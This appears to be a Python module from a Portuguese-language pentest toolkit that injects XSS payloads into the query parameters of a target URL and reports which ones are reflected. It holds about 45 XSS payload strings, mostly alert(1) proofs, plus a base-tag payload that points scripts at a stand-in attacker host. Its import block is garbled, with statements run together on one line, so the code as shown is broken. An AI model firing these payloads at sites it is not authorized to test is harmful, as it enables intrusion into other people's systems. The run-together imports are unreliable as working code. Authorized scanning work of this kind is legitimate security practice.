#!/usr/bin/env python3
"""Modulo de deteccao de XSS Vectors.

Testa vetores de XSS que nao estao cobertos por outros modulos:
  - media_events: XSS via eventos de midia (video, audio, source, object, embed)
  - uri_javascript: XSS via javascript: URI em diferentes contextos HTML
  - uri_data: XSS via data:text/html URI em diferentes contextos
  - iframe_vectors: XSS via iframe srcdoc
  - base_redirect: XSS via manipulacao de <base> tag
  - custom_elements: XSS via web components customizados
  - shadow_dom: XSS via Shadow DOM
  - slot_use: XSS via <slot> e <use> elements

Fluxo:
  1. Envia request para a URL alvo (baseline)
  2. Injeta payloads via query params
  3. Verifica se payload e refletido no HTML
  4. Classifica: vulnerable, blocked, error
  5. Retorna resultado consolidado com severidade
"""
import argparseimport htmlimport loggingfrom dataclasses import asdict, dataclassfrom urllib.parse import parse_qs, urlencode, urlparse, urlunparseimport httpxfrom mytools.core.utils import (    Cyber,    add_common_args,    color,    create_async_client,    create_banner,    fetch,    print_exploit_info,    run_main_loop,    safe_asyncio_run,    write_output,)logger = logging.getLogger("mytools.xssvectors")

_CATEGORY_MAP_DEFAULT: dict[str, list[str]] = {
    "media_events": [
        "video_source_onerror",
        "audio_source_onerror",
        "video_onerror",
        "audio_onerror",
        "object_onerror",
        "embed_onerror",
    ],
    "uri_javascript": [
        "a_href_js",
        "form_action_js",
        "embed_src_js",
        "object_data_js",
        "area_href_js",
        "svg_xlink_js",
        "iframe_src_js",
        "base_href_js_uri",
    ],
    "uri_data": [
        "iframe_data_html",
        "a_data_html",
        "embed_data_html",
        "object_data_html",
        "svg_data_html",
        "data_html_event",
    ],
    "iframe_vectors": [
        "srcdoc_basic",
        "srcdoc_encoded",
        "srcdoc_event",
        "srcdoc_nested",
        "srcdoc_sandbox",
        "srcdoc_csp",
    ],
    "base_redirect": [
        "base_href_js",
        "base_href_evil",
        "base_target_blank",
        "base_relative_script",
    ],
    "custom_elements": [
        "custom_element_script",
        "custom_is_attr",
        "custom_connected",
        "custom_form_associated",
        "custom_shadow",
    ],
    "shadow_dom": [
        "shadow_open_innerhtml",
        "shadow_closed_innerhtml",
        "shadow_delegation",
        "shadow_mutation",
        "shadow_script",
    ],
    "slot_use": [
        "slot_element",
        "use_href_js",
        "use_href_data",
        "use_href_svg",
        "slot_breakout",
    ],
}


def _load_category_map():
    from mytools.data import load_payloads
    data = load_payloads("web", "xssvectors", default={"category_map": _CATEGORY_MAP_DEFAULT})
    return data.get("category_map", _CATEGORY_MAP_DEFAULT)

_CATEGORY_MAP = _load_category_map()

_MEDIA_PAYLOADS_DEFAULT: list[tuple[str, str, str, list[str]]] = [
    (
        "video_source_onerror",
        '<video><source onerror=alert(1)></video>',
        "video_source",
        ["video", "source", "onerror"],
    ),
    (
        "audio_source_onerror",
        '<audio><source onerror=alert(1)></audio>',
        "audio_source",
        ["audio", "source", "onerror"],
    ),
    (
        "video_onerror",
        '<video src=x onerror=alert(1)>',
        "video_src",
        ["video", "onerror"],
    ),
    (
        "audio_onerror",
        '<audio src=x onerror=alert(1)>',
        "audio_src",
        ["audio", "onerror"],
    ),
    (
        "object_onerror",
        '<object data=x onerror=alert(1)>',
        "object_data",
        ["object", "onerror"],
    ),
    (
        "embed_onerror",
        '<embed src=x onerror=alert(1)>',
        "embed_src",
        ["embed", "onerror"],
    ),
]


def _load_media_payloads():
    from mytools.data import load_payloads
    data = load_payloads("web", "xssvectors", default={"media_payloads": _MEDIA_PAYLOADS_DEFAULT})
    return [tuple(x) for x in data.get("media_payloads", _MEDIA_PAYLOADS_DEFAULT)]

_MEDIA_PAYLOADS = _load_media_payloads()

_URI_JS_PAYLOADS_DEFAULT: list[tuple[str, str, str, list[str]]] = [
    (
        "a_href_js",
        '<a href="javascript:alert(1)">click</a>',
        "a_href",
        ["a", "href=", "javascript:"],
    ),
    (
        "form_action_js",
        '<form action="javascript:alert(1)"><input type=submit>',
        "form_action",
        ["form", "action=", "javascript:"],
    ),
    (
        "embed_src_js",
        '<embed src="javascript:alert(1)">',
        "embed_src",
        ["embed", "src=", "javascript:"],
    ),
    (
        "object_data_js",
        '<object data="javascript:alert(1)">',
        "object_data",
        ["object", "data=", "javascript:"],
    ),
    (
        "area_href_js",
        '<area href="javascript:alert(1)">',
        "area_href",
        ["area", "href=", "javascript:"],
    ),
    (
        "svg_xlink_js",
        '<svg><a xlink:href="javascript:alert(1)"><text>click</text></a></svg>',
        "svg_xlink",
        ["svg", "xlink:href", "javascript:"],
    ),
    (
        "iframe_src_js",
        '<iframe src="javascript:alert(1)">',
        "iframe_src",
        ["iframe", "src=", "javascript:"],
    ),
    (
        "base_href_js_uri",
        '<base href="javascript:alert(1)//">',
        "base_href",
        ["base", "href=", "javascript:"],
    ),
]


def _load_uri_js_payloads():
    from mytools.data import load_payloads
    data = load_payloads("web", "xssvectors", default={"uri_js_payloads": _URI_JS_PAYLOADS_DEFAULT})
    return [tuple(x) for x in data.get("uri_js_payloads", _URI_JS_PAYLOADS_DEFAULT)]

_URI_JS_PAYLOADS = _load_uri_js_payloads()

_URI_DATA_PAYLOADS_DEFAULT: list[tuple[str, str, str, list[str]]] = [
    (
        "iframe_data_html",
        '<iframe src="data:text/html,<script>alert(1)</script>">',
        "iframe_data",
        ["iframe", "data:text/html"],
    ),
    (
        "a_data_html",
        '<a href="data:text/html,<script>alert(1)</script>">click</a>',
        "a_data",
        ["a", "data:text/html"],
    ),
    (
        "embed_data_html",
        '<embed src="data:text/html,<script>alert(1)</script>">',
        "embed_data",
        ["embed", "data:text/html"],
    ),
    (
        "object_data_html",
        '<object data="data:text/html,<script>alert(1)</script>">',
        "object_data",
        ["object", "data:text/html"],
    ),
    (
        "svg_data_html",
        '<svg><image href="data:text/html,<script>alert(1)</script>">',
        "svg_data",
        ["svg", "data:text/html"],
    ),
    (
        "data_html_event",
        '<a href="data:text/html,<script>alert(1)</script>" onclick=alert(1)>',
        "data_event",
        ["data:text/html", "onclick"],
    ),
]


def _load_uri_data_payloads():
    from mytools.data import load_payloads
    data = load_payloads("web", "xssvectors", default={"uri_data_payloads": _URI_DATA_PAYLOADS_DEFAULT})
    return [tuple(x) for x in data.get("uri_data_payloads", _URI_DATA_PAYLOADS_DEFAULT)]

_URI_DATA_PAYLOADS = _load_uri_data_payloads()

_IFRAME_PAYLOADS_DEFAULT: list[tuple[str, str, str, list[str]]] = [
    (
        "srcdoc_basic",
        '<iframe srcdoc="<script>alert(1)</script>">',
        "srcdoc_basic",
        ["iframe", "srcdoc", "script"],
    ),
    (
        "srcdoc_encoded",
        '<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;">',
        "srcdoc_encoded",
        ["iframe", "srcdoc", "script"],
    ),
    (
        "srcdoc_event",
        '<iframe srcdoc="<img src=x onerror=alert(1)>">',
        "srcdoc_event",
        ["iframe", "srcdoc", "onerror"],
    ),
    (
        "srcdoc_nested",
        '<iframe srcdoc="<iframe srcdoc=<script>alert(1)</script>>">',
        "srcdoc_nested",
        ["iframe", "srcdoc"],
    ),
    (
        "srcdoc_sandbox",
        '<iframe sandbox srcdoc="<script>alert(1)</script>">',
        "srcdoc_sandbox",
        ["iframe", "sandbox", "srcdoc"],
    ),
    (
        "srcdoc_csp",
        '<iframe srcdoc="<meta http-equiv=refresh content=0;url=javascript:alert(1)>">',
        "srcdoc_csp",
        ["iframe", "srcdoc", "meta", "refresh"],
    ),
]


def _load_iframe_payloads():
    from mytools.data import load_payloads
    data = load_payloads("web", "xssvectors", default={"iframe_payloads": _IFRAME_PAYLOADS_DEFAULT})
    return [tuple(x) for x in data.get("iframe_payloads", _IFRAME_PAYLOADS_DEFAULT)]

_IFRAME_PAYLOADS = _load_iframe_payloads()

_BASE_PAYLOADS_DEFAULT: list[tuple[str, str, str, list[str]]] = [
    (
        "base_href_js",
        '<base href="javascript:alert(1)//">',
        "base_js",
        ["base", "href=", "javascript:"],
    ),
    (
        "base_href_evil",
        '<base href="//evil.example.com/">',
        "base_evil",
        ["base", "href="],
    ),
    (
        "base_target_blank",
        '<base target="_blank">',
        "base_target",
        ["base", "target="],
    ),
    (
        "base_relative_script",
        '<base href="data:text/html,<script>alert(1)</script>">',
        "base_data",
        ["base", "data:text/html"],
    ),
]


def _load_base_payloads():
    from mytools.data import load_payloads
    data = load_payloads("web", "xssvectors", default={"base_payloads": _BASE_PAYLOADS_DEFAULT})
    return [tuple(x) for x in data.get("base_payloads", _BASE_PAYLOADS_DEFAULT)]

_BASE_PAYLOADS = _load_base_payloads()

_CUSTOM_ELEMENT_PAYLOADS_DEFAULT: list[tuple[str, str, str, list[str]]] = [
    (
        "custom_element_script",
        "<x-alert><script>alert(1)</script></x-alert>",
        "custom_tag",
        ["x-alert", "script"],
    ),
    (
        "custom_is_attr",
        '<div is="x-alert"></div>',
        "custom_is",
        ["is=", "x-alert"],
    ),
    (
        "custom_connected",
        "<x-script></x-script><script>alert(1)</script>",
        "custom_script",
        ["x-script", "script"],
    ),
    (
        "custom_form_associated",
        '<x-field name="test"><script>alert(1)</script></x-field>',
        "custom_form",
        ["x-field", "script"],
    ),
    (
        "custom_shadow",
        "<x-card><script>alert(1)</script></x-card>",
        "custom_shadow",
        ["x-card", "script"],
    ),
]


def _load_custom_element_payloads():
    from mytools.data import load_payloads
    data = load_payloads("web", "xssvectors", default={"custom_element_payloads": _CUSTOM_ELEMENT_PAYLOADS_DEFAULT})
    return [tuple(x) for x in data.get("custom_element_payloads", _CUSTOM_ELEMENT_PAYLOADS_DEFAULT)]

_CUSTOM_ELEMENT_PAYLOADS = _load_custom_element_payloads()

_SHADOW_DOM_PAYLOADS_DEFAULT: list[tuple[str, str, str, list[str]]] = [
    (
        "shadow_open_innerhtml",
        "<div id=shadow></div><script>document.getElementById('shadow').attachShadow({mode:'open'}).innerHTML='<img src=x onerror=alert(1)>'</script>",
        "shadow_open",
        ["attachShadow", "innerHTML", "onerror"],
    ),
    (
        "shadow_closed_innerhtml",
        "<div id=shadow></div><script>document.getElementById('shadow').attachShadow({mode:'closed'}).innerHTML='<img src=x onerror=alert(1)>'</script>",
        "shadow_closed",
        ["attachShadow", "innerHTML"],
    ),
    (
        "shadow_delegation",
        "<div id=shadow></div><script>var s=document.getElementById('shadow').attachShadow({mode:'open'});s.innerHTML='<button onclick=alert(1)>test</button>'</script>",
        "shadow_delegation",
        ["attachShadow", "onclick"],
    ),
    (
        "shadow_mutation",
        "<div id=shadow></div><script>var s=document.getElementById('shadow').attachShadow({mode:'open'});var o=new MutationObserver(function(){alert(1)});o.observe(s,{childList:true,subtree:true})</script>",
        "shadow_mutation",
        ["attachShadow", "MutationObserver"],
    ),
    (
        "shadow_script",
        "<div id=shadow></div><script>var s=document.getElementById('shadow').attachShadow({mode:'open'});s.innerHTML='<script>alert(1)</script>'</script>",
        "shadow_script",
        ["attachShadow", "innerHTML", "script"],
    ),
]


def _load_shadow_dom_payloads():
    from mytools.data import load_payloads
    data = load_payloads("web", "xssvectors", default={"shadow_dom_payloads": _SHADOW_DOM_PAYLOADS_DEFAULT})
    return [tuple(x) for x in data.get("shadow_dom_payloads", _SHADOW_DOM_PAYLOADS_DEFAULT)]

_SHADOW_DOM_PAYLOADS = _load_shadow_dom_payloads()

_SLOT_USE_PAYLOADS_DEFAULT: list[tuple[str, str, str, list[str]]] = [
    (
        "slot_element",
        "<slot><script>alert(1)</script></slot>",
        "slot_element",
        ["slot", "script"],
    ),
    (
        "use_href_js",
        '<use href="javascript:alert(1)"/>',
        "use_href_js",
        ["use", "href=", "javascript:"],
    ),
    (
        "use_href_data",
        '<use href="data:image/svg+xml,<svg onload=alert(1)>"/>',
        "use_href_data",
        ["use", "data:"],
    ),
    (
        "use_href_svg",
        '<svg><use href="data:image/svg+xml,<svg onload=alert(1)>"/></svg>',
        "use_svg",
        ["svg", "use", "data:"],
    ),
    (
        "slot_breakout",
        "<div><slot><img src=x onerror=alert(1)></slot></div>",
        "slot_breakout",
        ["slot", "onerror"],
    ),
]


def _load_slot_use_payloads():
    from mytools.data import load_payloads
    data = load_payloads("web", "xssvectors", default={"slot_use_payloads": _SLOT_USE_PAYLOADS_DEFAULT})
    return [tuple(x) for x in data.get("slot_use_payloads", _SLOT_USE_PAYLOADS_DEFAULT)]

_SLOT_USE_PAYLOADS = _load_slot_use_payloads()

_ALL_PAYLOADS: dict[str, list[tuple[str, str, str, list[str]]]] = {
    "media_events": _MEDIA_PAYLOADS,
    "uri_javascript": _URI_JS_PAYLOADS,
    "uri_data": _URI_DATA_PAYLOADS,
    "iframe_vectors": _IFRAME_PAYLOADS,
    "base_redirect": _BASE_PAYLOADS,
    "custom_elements": _CUSTOM_ELEMENT_PAYLOADS,
    "shadow_dom": _SHADOW_DOM_PAYLOADS,
    "slot_use": _SLOT_USE_PAYLOADS,
}


@dataclass(frozen=True, slots=True)
class XSSVectorAttempt:
    """Tentativa individual de XSS Vector."""

    technique: str
    category: str
    context: str
    payload: str
    method: str
    status_baseline: int
    status_test: int
    size_baseline: int
    size_test: int
    status_changed: bool
    size_changed: bool
    vulnerable: bool
    details: str
    error: str
    exploit: str = ""
    tool: str = ""


@dataclass(frozen=True, slots=True)
class XSSVectorResult:
    """Resultado consolidado do scan de XSS Vectors."""

    target: str
    tls: bool
    baseline_status: int
    baseline_size: int
    attempts: list[XSSVectorAttempt]
    vulnerable_techniques: list[str]
    blocked_techniques: list[str]
    issues: list[str]
    overall_status: str


def _inject_payload(url: str, param: str, payload: str) -> str:
    """Injeta um payload como query parameter na URL."""
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    params[param] = [payload]
    new_query = urlencode(params, doseq=True)
    return urlunparse(parsed._replace(query=new_query))


def _check_xss_reflection(body_str: str, payload: str) -> bool:
    """Verifica se o payload XSS esta refletido no HTML."""
    return payload.lower() in body_str.lower()


async def _test_xss_category(
    client: httpx.AsyncClient,
    url: str,
    timeout: float,
    b_status: int,
    b_size: int,
    payloads: list[tuple[str, str, str, list[str]]],
    category: str,
) -> list[XSSVectorAttempt]:
    """Testa uma categoria de payloads XSS contra o alvo."""
    results: list[XSSVectorAttempt] = []

    for technique, payload, context, _indicators in payloads:
        param = f"_xss_{technique}"
        test_url = _inject_payload(url, param, payload)

        try:
            t_status, _t_headers, t_body, _t_raw = await fetch(client, test_url, timeout=timeout)
            t_size = len(t_body)
            body_str = t_body.decode(errors="replace")

            reflected = _check_xss_reflection(body_str, payload)
            status_changed = t_status != b_status
            size_changed = abs(t_size - b_size) > 50

            decoded = html.unescape(payload)
            reflected_decoded = _check_xss_reflection(body_str, decoded) if decoded != payload else reflected
            vulnerable = reflected and (decoded == payload or reflected_decoded)

            details = ""
            if vulnerable:
                details = f"Payload refletido sem encoding no contexto {context}"

            results.append(XSSVectorAttempt(
                technique=technique, category=category, context=context,
                payload=payload[:200], method="GET",
                status_baseline=b_status, status_test=t_status,
                size_baseline=b_size, size_test=t_size,
                status_changed=status_changed, size_changed=size_changed,
                vulnerable=vulnerable, details=details, error="",
                exploit="<img src=x onerror=alert(1)>" if vulnerable else "",
                tool="XSStrike",
            ))

        except Exception as e:
            results.append(XSSVectorAttempt(
                technique=technique, category=category, context=context,
                payload=payload[:200], method="GET",
                status_baseline=b_status, status_test=0,
                size_baseline=b_size, size_test=0,
                status_changed=False, size_changed=False,
                vulnerable=False, details="", error=str(e)[:100],
            ))

    return results


def print_results(result: XSSVectorResult) -> None:
    """Exibe os resultados do scan de XSS Vectors."""
    vuln = [a for a in result.attempts if a.vulnerable]
    blocked = [a for a in result.attempts if not a.vulnerable and not a.error]
    errors = [a for a in result.attempts if a.error]

    print(color("\n--- XSS Vectors Detection ---", Cyber.CYAN, Cyber.BOLD))
    print(color(f"  Alvo:         {result.target}", Cyber.WHITE))
    print(color(f"  TLS:          {'sim' if result.tls else 'nao'}", Cyber.WHITE))
    print(color(f"  Baseline:     {result.baseline_status} ({result.baseline_size} bytes)", Cyber.WHITE))
    print(color(f"  Testes:       {len(result.attempts)}", Cyber.WHITE))
    print(color(f"  Vulneraveis:  {len(vuln)}", Cyber.GREEN if vuln else Cyber.GRAY))
    print(color(f"  Bloqueados:   {len(blocked)}", Cyber.GRAY))
    print(color(f"  Erros:        {len(errors)}", Cyber.RED if errors else Cyber.GRAY))

    if vuln:
        print(color("\n  [!] Vulnerabilidades encontradas:", Cyber.RED))
        seen: set[str] = set()
        for a in vuln:
            key = f"{a.technique}:{a.context}"
            if key in seen:
                continue
            seen.add(key)
            print(color(f"    [{a.category}] {a.technique}", Cyber.RED))
            print(color(f"      Contexto: {a.context}", Cyber.WHITE))
            if a.details:
                print(color(f"      Detalhes: {a.details}", Cyber.GRAY))
            print_exploit_info(a.exploit, a.tool)
        print(color(f"\n  Total: {len(vuln)} vulneraveis de {len(result.attempts)} testes", Cyber.WHITE))
    else:
        print(color("\n  [+] Nenhuma vulnerabilidade de XSS Vector detectada", Cyber.GREEN))

    if result.issues:
        print(color("\n  [!] Observacoes:", Cyber.YELLOW))
        for issue in result.issues:
            print(color(f"    - {issue}", Cyber.YELLOW))


async def run_scan(
    target: str,
    categories: list[str],
    timeout: float,
    output_file: str | None,
) -> int:
    """Executa o scan de XSS Vectors."""
    logger.info("XSS Vectors scan para %s", target)
    tls = target.startswith("https://")

    async with create_async_client(timeout=timeout) as client:
        try:
            b_status, _b_headers, b_body, _b_raw = await fetch(client, target, timeout=timeout)
            b_size = len(b_body)
        except Exception as e:
            print(color(f"Erro ao acessar {target}: {e}", Cyber.RED))
            return 1

        all_attempts: list[XSSVectorAttempt] = []
        test_categories = categories if categories else list(_CATEGORY_MAP.keys())

        for cat in test_categories:
            payloads = _ALL_PAYLOADS.get(cat, [])
            if payloads:
                all_attempts.extend(
                    await _test_xss_category(client, target, timeout, b_status, b_size, payloads, cat),
                )

        vuln_techs = list({a.technique for a in all_attempts if a.vulnerable})
        blocked_techs = list({a.technique for a in all_attempts if not a.vulnerable and not a.error})
        issues: list[str] = []

        if not all_attempts:
            issues.append("Nenhum teste de XSS Vector executado")

        result = XSSVectorResult(
            target=target, tls=tls,
            baseline_status=b_status, baseline_size=b_size,
            attempts=all_attempts,
            vulnerable_techniques=vuln_techs,
            blocked_techniques=blocked_techs,
            issues=issues,
            overall_status="vulnerable" if vuln_techs else ("safe" if blocked_techs else "unknown"),
        )

        print_results(result)
        logger.info(
            "XSS Vectors scan concluido: %d testes, %d vulneraveis",
            len(all_attempts), len(vuln_techs),
        )

        if output_file:
            write_output(output_file, asdict(result))
            logger.info("Resultados salvos em %s", output_file)

        return 1 if vuln_techs else 0


def banner_art() -> None:
    """Exibe a banner do modulo."""
    art = r"""
    _    _  _____ ______     _______ __   __ ______ _______ _____ __   _ ______
   | |  | |/ ____|  ____|   |______   \_/   |  ____ |______   |   | \  | |     \
   | |  | | |    | |__         |  |    |    |  |__| |    |  |   | |  | | |  ___/
   | |/\| | |    |  __|        |  |    |    |  |  | |    |  |   | |  | | | |
   |  /  \ | |___| |____       |  |    |    |  |  | |    |  |   | |  | | | |___
   |__/  \_|_____|______|      |__|    |    |__|  |_|    |__|   |__| |__|______|
"""
    create_banner(art, "   xssvectors: media, javascript:uri, data:uri, iframe, base, custom, shadow, slot/use")()


def build_parser() -> argparse.ArgumentParser:
    """Construtor do parser de argumentos."""
    parser = argparse.ArgumentParser(
        prog="mytools-xssvectors",
        description="XSS Vectors — detecta vetores de XSS via midia, URIs, iframe, base, custom elements, shadow DOM.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Exemplos:\n"
            "  mytools-xssvectors https://target.com\n"
            "  mytools-xssvectors https://target.com -c media_events\n"
            "  mytools-xssvectors https://target.com -c uri_javascript\n"
            "  mytools-xssvectors https://target.com -c iframe_vectors\n"
            "  mytools-xssvectors https://target.com --proxy http://127.0.0.1:8080"
        ),
    )
    parser.add_argument("url", help="URL alvo para o scan")
    parser.add_argument(
        "-c", "--category",
        default="all",
        choices=["all", "media_events", "uri_javascript", "uri_data",
                 "iframe_vectors", "base_redirect", "custom_elements",
                 "shadow_dom", "slot_use"],
        help="Categoria de testes (default: todas)",
    )
    add_common_args(parser)
    return parser


def run_once(args: argparse.Namespace) -> int:
    """Executa um scan XSS Vectors a partir de argumentos parseados."""
    logger.info("XSS Vectors scan iniciado para %s", args.url)
    categories: list[str] = []
    if getattr(args, "category", None) and args.category != "all":
        categories = [args.category]
    return safe_asyncio_run(
        run_scan(
            target=args.url,
            categories=categories,
            timeout=getattr(args, "timeout", 10),
            output_file=getattr(args, "output", None),
        ),
    )


def main() -> int:
    """Entry point do modulo XSS Vectors."""
    return run_main_loop(
        parser=build_parser(),
        banner_fn=banner_art,
        run_fn=run_once,
        has_target=lambda a: bool(getattr(a, "url", None) or getattr(a, "target", None)),
        prompt="xssvectors> ",
        description="XSS Vectors interativo.",
        example="https://target.com -c uri_javascript",
        contextual_help=(
            "Uso: <url> [opcoes]\n"
            "Exemplos:\n"
            "  https://target.com\n"
            "  https://target.com -c media_events\n"
            "  https://target.com -c uri_javascript\n"
            "  https://target.com -c iframe_vectors\n"
            "  https://target.com --proxy http://127.0.0.1:8080"
        ),
    )
